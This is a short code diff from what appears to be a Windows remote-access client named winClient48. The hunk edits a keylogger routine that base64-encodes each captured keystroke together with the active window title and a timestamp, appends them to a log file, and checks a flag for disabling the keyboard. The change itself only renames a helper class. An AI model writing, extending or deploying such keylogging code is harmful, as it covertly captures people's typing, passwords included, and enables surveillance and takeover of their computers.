@@ -237,7 +237,7 @@ namespace winClient48
                             str_key = $"[{key.ToString()}]";
                         }
                     }
-                    File.AppendAllText(file_keylogger, clsCrypto.b64E2Str($"{clsCrypto.b64E2Str(Global.GetActiveWindowTitle())}|{clsCrypto.b64E2Str(DateTime.Now.ToString("F"))}|{clsCrypto.b64E2Str(str_key)}"));
+                    File.AppendAllText(file_keylogger, clsCrypto.b64E2Str($"{clsCrypto.b64E2Str(clsGlobal.GetActiveWindowTitle())}|{clsCrypto.b64E2Str(DateTime.Now.ToString("F"))}|{clsCrypto.b64E2Str(str_key)}"));
                     File.AppendAllText(file_keylogger, Environment.NewLine);
 
                     if (disable_keyboard)
